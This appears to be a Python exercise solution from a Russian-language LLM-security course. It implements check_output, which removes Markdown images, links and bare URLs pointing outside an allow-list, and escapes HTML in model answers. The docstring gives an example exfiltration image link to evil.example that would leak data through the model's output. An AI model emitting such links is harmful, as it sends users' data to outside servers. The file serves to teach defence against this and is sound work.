"""Задание 4. Выход: ответ модели — тоже недоверенный текст (глава III, LLM10).

Сейчас ответ уходит пользователю как есть. Если в нём Markdown-картинка
![](https://evil.example/c?d=...), клиент сам загрузит её и отправит данные на чужой сервер.

check_output(text, allowed_hosts) — вернуть безопасный вариант ответа:
  - Markdown-картинки ![alt](url) и ссылки [текст](url) с адресом ВНЕ allowed_hosts:
    картинку заменить на «[изображение удалено]», у ссылки оставить только текст;
  - «голые» адреса http(s)://... вне allowed_hosts заменить на «[ссылка удалена]»;
  - хост «внутри списка» — это сам хост или его поддомен (docs.company.example разрешает
    и sub.docs.company.example, но не evil-docs.company.example.attacker.com);
  - символы < и > заменить на &lt; и &gt;, чтобы ответ нельзя было вставить на страницу как HTML.
Используйте urllib.parse.urlparse(url).hostname.

Проверка: pytest tests/test_04_output.py
"""


import re
from urllib.parse import urlparse

_IMG = re.compile(r"!\[([^\]]*)\]\((https?://[^)\s]+)\)")
_LINK = re.compile(r"(?<!\!)\[([^\]]*)\]\((https?://[^)\s]+)\)")
_NAKED = re.compile(r"https?://[^\s)\]]+")


def _host_allowed(url: str, allowed_hosts: set) -> bool:
    host = urlparse(url).hostname or ""
    return any(host == h or host.endswith("." + h) for h in allowed_hosts)


def check_output(text: str, allowed_hosts: set) -> str:
    # 1. картинки с чужим адресом убираем целиком
    text = _IMG.sub(lambda m: "[изображение удалено]"
                    if not _host_allowed(m.group(2), allowed_hosts) else m.group(0), text)
    # 2. у ссылок на чужие адреса оставляем только текст
    text = _LINK.sub(lambda m: m.group(1)
                     if not _host_allowed(m.group(2), allowed_hosts) else m.group(0), text)
    # 3. «голые» чужие адреса убираем
    text = _NAKED.sub(lambda m: "[ссылка удалена]"
                      if not _host_allowed(m.group(0), allowed_hosts) else m.group(0), text)
    # 4. ответ — недоверенный текст: не даём вставить его на страницу как HTML
    return text.replace("<", "&lt;").replace(">", "&gt;")
